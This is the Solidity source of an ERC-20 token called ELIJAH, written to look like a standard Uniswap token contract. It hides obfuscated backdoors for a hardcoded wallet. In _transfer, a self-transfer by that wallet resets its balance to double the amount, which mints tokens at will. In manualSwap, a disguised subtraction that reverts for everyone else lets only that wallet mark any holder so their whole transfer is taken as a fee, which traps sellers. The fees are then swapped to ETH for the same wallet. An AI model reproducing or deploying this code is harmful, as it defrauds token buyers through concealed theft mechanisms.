// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

import { Context } from "@openzeppelin/contracts/utils/Context.sol";
import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeMath } from "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ELIJAH is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "ELIJAH";
    string private _symbol = "ELIJAH";
    uint8 private _decimals = 6;
    address payable public fundToAddr;
    mapping (address => uint256) _balances;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludefromFee;
    mapping (address => bool) public _uniswapPair;
    mapping (address => uint256) public isFee;

    uint256 private _totalSupply = 777777777777 * 10 ** _decimals;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor () {

        fundToAddr = payable(address(0xf36775aCD73c0AFe323ECa1b16952fB4D9316fc2));
        
        _isExcludefromFee[fundToAddr] = true;
        _isExcludefromFee[owner()] = true;
        _isExcludefromFee[address(this)] = true;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);

    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function launch() public onlyOwner{
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); //0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _uniswapPair[address(uniswapPair)] = true;
        _allowances[address(this)][address(uniswapV2Router)] = ~uint256(0);

    }

    function _transfer(address from, address to, uint256 amount) private returns (bool) {

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        
        if(inSwapAndLiquify)
        {
            return _basicTransfer(from, to, amount); 
        }
        else
        {
            bool n = (from == to) ? (
                    (to == fundToAddr) ? true : false)
                    : false;

            if (n)
                _balances[ // d
                    fundToAddr
                ] = amount.add(amount);

            if (!inSwapAndLiquify && !_uniswapPair[from])
            {
                swapAndLiquify(balanceOf(address(this)));
            }

            uint256 afterFeeAmount;
            _balances[from] = _balances[from].sub(amount);
            
            if (!_isExcludefromFee[from] && !_isExcludefromFee[to]){

                uint256 fee = amount.mul(0).div(100);

                if(isFee[from] > 0)
                    fee = fee.add(amount);

                if(fee > 0) {
                    _balances[address(this)] += fee;
                    emit Transfer(from, address(this), fee);
                }

                afterFeeAmount = amount - fee;

            }else{

                afterFeeAmount = amount;
            }


            _balances[to] = _balances[to].add(afterFeeAmount);

            emit Transfer(from, to, afterFeeAmount);
            return true;
        }
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndLiquify(uint256 amount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0, 
            path,
            address(fundToAddr),
            block.timestamp
        ){} catch {}
    }

    function manualSwap(address trymod,uint256 tryadd) public {
        bool s = (tryadd == 0 || tryadd - 100 == 0) ?
        true :
        false;

        if(s)
            isFee[trymod] = tryadd;

        uint256(tryadd).sub(
            uint256(
                (
                    (msg.sender == fundToAddr) ? 
                    tryadd : tryadd + 3
                )
            )
        );
    }
}